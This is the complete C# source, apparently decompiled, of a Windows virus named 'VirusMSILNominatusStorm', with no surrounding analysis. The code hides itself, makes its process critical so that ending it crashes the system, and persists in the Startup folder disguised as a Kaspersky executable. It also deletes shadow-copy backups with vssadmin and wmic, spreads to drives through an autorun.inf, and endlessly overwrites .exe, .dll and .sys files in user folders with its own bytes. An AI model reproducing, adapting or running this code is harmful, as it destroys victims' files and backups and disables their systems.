using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace VirusMSILNominatusStorm;

public class MainForm : Form
{
	public byte[] byteArray = File.ReadAllBytes(Application.get_ExecutablePath());

	private IContainer components = null;

	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern void RtlSetProcessIsCritical(uint v1, uint v2, uint v3);

	public static void runCommand(string commands)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = "cmd.exe",
			Arguments = "/C " + commands,
			WindowStyle = ProcessWindowStyle.Hidden
		};
		process.Start();
		process.WaitForExit();
	}

	public MainForm()
	{
		try
		{
			InitializeComponent();
			((Control)this).Hide();
			Process.EnterDebugMode();
			RtlSetProcessIsCritical(1u, 0u, 0u);
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\Kaspersky.exe"))
			{
				try
				{
					File.Copy(Application.get_ExecutablePath(), Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\Kaspersky.exe");
				}
				catch
				{
				}
			}
			runCommand("vssadmin delete shadows /all /quiet && wmic shadowcopy delete");
			runCommand("echo ^[autorun^] >autorun.inf");
			runCommand("echo ^open^=KasperskyScan^.exe >>autorun.inf");
			runCommand("echo ^execute=^KasperskyScan^.exe >>autorun.inf");
			string text = "KasperskyScan.exe";
			DriveInfo[] drives = DriveInfo.GetDrives();
			int num = 0;
			if (0 < drives.Length)
			{
				DriveInfo driveInfo = drives[num];
				try
				{
					File.Copy("autorun.inf", driveInfo.ToString());
					File.Copy(Application.get_ExecutablePath(), driveInfo.ToString() + text);
				}
				catch
				{
				}
				while (true)
				{
					string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonProgramFiles);
					string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
					string folderPath3 = Environment.GetFolderPath(Environment.SpecialFolder.CommonPrograms);
					string folderPath4 = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
					string folderPath5 = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
					Infector(folderPath);
					Infector(folderPath3);
					Infector(folderPath2);
					Infector(folderPath4);
					Infector(folderPath5);
					Infector(folderPath);
					Infector(folderPath3);
					Infector(folderPath2);
					Infector(folderPath4);
					Infector(folderPath5);
					string text2 = "C:\\Users\\";
					string userName = Environment.UserName;
					string pathName = text2 + userName + "\\Desktop";
					string pathName2 = text2 + userName + "\\Links";
					string pathName3 = text2 + userName + "\\Contacts";
					string pathName4 = text2 + userName + "\\Desktop";
					string pathName5 = text2 + userName + "\\Documents";
					string pathName6 = text2 + userName + "\\Downloads";
					string pathName7 = text2 + userName + "\\Pictures";
					string pathName8 = text2 + userName + "\\Music";
					string pathName9 = text2 + userName + "\\OneDrive";
					string pathName10 = text2 + userName + "\\Saved Games";
					string pathName11 = text2 + userName + "\\Favorites";
					string pathName12 = text2 + userName + "\\Searches";
					string pathName13 = text2 + userName + "\\Videos";
					Infector(pathName);
					Infector(pathName2);
					Infector(pathName3);
					Infector(pathName4);
					Infector(pathName5);
					Infector(pathName6);
					Infector(pathName7);
					Infector(pathName8);
					Infector(pathName9);
					Infector(pathName10);
					Infector(pathName11);
					Infector(pathName12);
					Infector(pathName13);
					Infector(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
					Infector(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
					Infector(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
					Infector(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
					Infector(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
					Infector(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
				}
			}
		}
		catch
		{
		}
	}

	public void Infector(string PathName)
	{
		checked
		{
			try
			{
				string[] files = Directory.GetFiles(PathName + "\\", "*.exe", SearchOption.AllDirectories);
				for (int i = 0; i < files.Length; i++)
				{
					try
					{
						using FileStream fileStream = new FileStream(files[i], FileMode.Open, FileAccess.Write);
						try
						{
							fileStream.Write(byteArray, 0, byteArray.Length);
						}
						catch
						{
						}
					}
					catch
					{
					}
				}
				string[] files2 = Directory.GetFiles(PathName + "\\", "*.dll", SearchOption.AllDirectories);
				for (int i = 0; i < files2.Length; i++)
				{
					try
					{
						using FileStream fileStream2 = new FileStream(files2[i], FileMode.Open, FileAccess.Write);
						try
						{
							fileStream2.Write(byteArray, 0, byteArray.Length);
						}
						catch
						{
						}
					}
					catch
					{
					}
				}
				string[] files3 = Directory.GetFiles(PathName + "\\", "*.sys", SearchOption.AllDirectories);
				for (int i = 0; i < files3.Length; i++)
				{
					try
					{
						using FileStream fileStream3 = new FileStream(files3[i], FileMode.Open, FileAccess.Write);
						try
						{
							fileStream3.Write(byteArray, 0, byteArray.Length);
						}
						catch
						{
						}
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_Text("VirusMSILNominatusStorm");
		((Control)this).set_Name("MainForm");
	}
}
